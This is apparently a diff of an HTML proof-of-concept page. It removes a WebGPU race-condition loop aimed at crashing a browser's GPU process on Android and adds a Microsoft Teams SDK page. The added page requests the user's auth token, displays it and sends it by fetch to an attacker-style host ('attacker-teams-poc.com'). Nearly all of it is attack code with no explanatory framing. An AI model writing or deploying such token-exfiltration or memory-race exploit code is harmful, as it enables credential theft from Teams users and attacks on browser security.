@@ -1,51 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Teams PoC</title>
+    <!-- Include the official Teams JS SDK -->
+    <script src="https://res.cdn.office.net/teams-js/2.20.0/js/MicrosoftTeams.min.js"></script>
+</head>
 <body>
-
-<video id="video" autoplay muted></video>
-
-<script>
-navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-  video.srcObject = stream;
-});
-
-async function triggerBug() {
-    const adapter = await navigator.gpu.requestAdapter();
-    const device = await adapter.requestDevice();
-
-    // Create a video element (backed by Android SharedMemory/HardwareBuffer)
-    const video = document.createElement('video');
-    video.src = "test.mp4";
-    await video.play();
-
-    // Loop continuously to race the IPC boundary
-    while (true) {
-        try {
-            // This triggers SharedResourceMemory::BeginAccess over IPC
-            const externalTexture = device.importExternalTexture({ source: video });
+    <h1>Security PoC</h1>
+    <script>
+        microsoftTeams.app.initialize().then(() => {
+            console.log("Teams SDK Initialized");
             
-            // Immediately try to destroy it while the GPU process is processing BeginAccess
-            externalTexture.destroy(); // Triggers EndAccess / Destroy
-            
-            // Try to map a buffer tied to it simultaneously
-            const buffer = device.createBuffer({
-                size: 1024,
-                usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC
+            // This is the "Magic" function that should be restricted
+            // If we get an Auth Token here, we have won.
+            microsoftTeams.authentication.getAuthToken({
+                successCallback: function(token) {
+                    alert("TOKEN STOLEN: " + token.substring(0, 20) + "...");
+                    console.log("Token: " + token);
+                    // Send this to your server
+                    fetch('https://attacker-teams-poc.com/log?token=' + token);
+                },
+                failureCallback: function(err) {
+                    alert("Failure: " + err);
+                }
             });
-            
-            // Force an asynchronous map, trying to hit the TOCTOU window
-            buffer.mapAsync(GPUMapMode.WRITE).then(() => {
-                // If we get here when we shouldn't, we broke the state machine!
-                buffer.unmap();
-            });
-
-        } catch (e) {
-            // Ignore normal WebGPU validation errors,we are looking for a crash in logcat
-        }
-    }
-}
-triggerBug();
-</script>
-
+        }).catch(err => alert("Init failed: " + err));
+    </script>
 </body>
 </html>
